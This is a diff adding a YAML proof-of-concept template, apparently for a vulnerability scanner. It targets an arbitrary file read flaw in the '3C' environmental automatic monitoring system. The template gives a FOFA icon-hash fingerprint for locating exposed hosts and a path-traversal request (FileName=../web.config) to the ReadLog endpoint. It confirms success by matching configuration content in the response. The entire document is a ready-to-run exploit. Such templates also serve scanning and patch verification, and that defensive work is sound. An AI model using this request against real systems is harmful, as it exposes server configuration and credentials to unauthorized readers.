@@ -1,0 +1,18 @@
+id: poc-yaml-3ctech-readlog-anyfile-read
+info:
+  name: 3C环境自动监测监控系统 ReadLog 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 3C环境自动监测监控系统
+  fofa: icon_hash="-338936081"
+requests:
+- method: GET
+  path: /ajax/sys/LogService.ashx?Method=ReadLog&FileName=../web.config
+  headers:
+    X-Requested-With: XMLHttpRequest
+    Referer: http://{{.host}}{{.port}}/Sys/Log/FileLogList.aspx
+  expression: status_code == 200 && contains(body,"<configuration>") && contains(body,"system.web.extensions")
+    && contains(body,"PublicKeyToken=")
+variables: {}
+transport: http
